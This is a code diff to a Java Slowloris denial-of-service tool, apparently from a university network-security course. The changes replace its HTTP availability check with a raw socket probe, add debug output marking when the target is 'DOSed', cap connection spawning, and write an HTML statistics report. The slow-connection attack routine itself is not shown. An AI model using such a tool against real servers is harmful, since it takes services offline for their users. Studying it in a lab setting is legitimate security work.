@@ -1,8 +1,9 @@
 package in.ac.iiitd.ns;
 
 import java.io.IOException;
-import java.net.HttpURLConnection;
-import java.net.URL;
+import java.net.InetAddress;
+import java.net.Socket;
+import java.net.SocketTimeoutException;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.concurrent.Executor;
@@ -39,7 +40,7 @@ public class SlowLoris {
 
     private final Executor exec;
 
-    // Set Default Vlaues 
+    // Set Default Values 
     static{
         CLA.put("-h", "localhost");     // hostname
         CLA.put("-p", "80");            // port
@@ -61,7 +62,10 @@ public class SlowLoris {
         public void run() {
             // TODO Auto-generated method stub
             for(int i = 0; ; i++){
-                stats.add(new Stats("" + i, closed, pending, connected, isAvailable?connections:0));
+                stats.add(new Stats(i, closed, pending, connected, isAvailable?connections:0));
+                if(DEBUG){
+                    System.out.println(stats.get(i).toString());
+                }
                 try {
                     Thread.sleep(995);
                 } catch (InterruptedException e) {
@@ -72,28 +76,29 @@ public class SlowLoris {
         }
     };
 
-    
     private Runnable ping = new Runnable() {
 
         @Override
         public void run() {
             // TODO Auto-generated method stub
-
+            Socket socket = null;
             while(true){
                 try {
-                    HttpURLConnection connection = (HttpURLConnection) new URL(hostname).openConnection();
-                    connection.setConnectTimeout(timeout);
-                    connection.setReadTimeout(timeout);
-                    connection.setRequestMethod("HEAD");
-                    int responseCode = connection.getResponseCode();
-                    if (200 <= responseCode && responseCode <= 399){
-                        clearDOSed();
-                    }
-                } catch (IOException exception) {
+                    socket = new Socket(InetAddress.getByName(hostname), 80);
+                    socket.setSoTimeout(timeout);
+                    socket.getInputStream().read();
+                    clearDOSed();
+                } catch (SocketTimeoutException e) {
                     setDOSed();
-                } catch(Exception e){
-                    if(DEBUG)
-                        e.printStackTrace();
+                } catch(IOException e){
+                    
+                }
+
+                if(socket != null){
+                    try {
+                        socket.close();
+                    } catch (IOException e) {
+                    }
                 }
 
                 try {
@@ -124,10 +129,16 @@ public class SlowLoris {
     }
 
     public void setDOSed(){
+        if(DEBUG){
+            System.out.println("SERVER DOSed");
+        }
         isAvailable = false;
     }
 
     public void clearDOSed(){
+        if(DEBUG){
+            System.out.println("SERVER OK");
+        }
         isAvailable = true;
     }
 
@@ -147,21 +158,26 @@ public class SlowLoris {
         pending = connections;
         connected = 0;
         closed = 0;
-        isAvailable = true;		
+        isAvailable = true;
+
+        if(DEBUG){
+            System.out.println("Values Set");
+        }
     }
 
     public void attack(){
+        System.out.println("Attack Started for Duration : " + time/1000 + "s");
         long sTime = System.currentTimeMillis() - 500;
         int i = 0;
 
         // To perform Http PING repeatedly 
         new Thread(ping).start();
-        
+
         // To Save the network snapshots in the interval of 1s
         new Thread(UPDATE_STATS).start();
-        
+
         while(System.currentTimeMillis() - sTime < time){
-            for(int r = 0; r < rate && isAvailable; r++) {
+            for(int r = 0; r < rate && pending > 0 && isAvailable; r++) {
                 exec.execute(new Connection(hostname, port, interval, this, i += 3));
             }
 
@@ -172,8 +188,9 @@ public class SlowLoris {
                 e.printStackTrace();
             }
         }
-        
+
         Stats.genHTML();
+        System.exit(0);
     }
 
     private static int getCLAInt(String key) {
